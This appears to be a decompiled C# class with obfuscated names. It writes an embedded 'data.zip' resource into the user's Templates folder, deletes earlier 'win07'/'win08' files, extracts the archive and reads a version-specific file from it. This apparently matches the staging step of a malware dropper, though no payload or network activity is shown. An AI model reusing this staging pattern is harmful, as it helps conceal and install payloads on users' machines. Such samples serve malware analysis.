using System;
using System.Diagnostics;
using System.IO;
using ndhavrnigh.My.Resources;

namespace ndhavrnigh;

public class musipc
{
	[DebuggerNonUserCode]
	public musipc()
	{
	}

	public object getWin()
	{
		string text = Environment.OSVersion.ToString();
		zemuse zemuse2 = new zemuse();
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\";
		string text3 = text2 + "data";
		string path = text2 + "win07";
		string path2 = text2 + "win08";
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		if (!File.Exists(text3 + ".zip"))
		{
			File.WriteAllBytes(text3 + ".zip", Resources.data);
		}
		zemuse2.uindTuile(text3, text2);
		if (text.Contains("6.1") | text.Contains("6.01"))
		{
			return File.ReadAllText(path).Trim().Split(new char[1] { ' ' });
		}
		return File.ReadAllText(path2).Trim().Split(new char[1] { ' ' });
	}
}
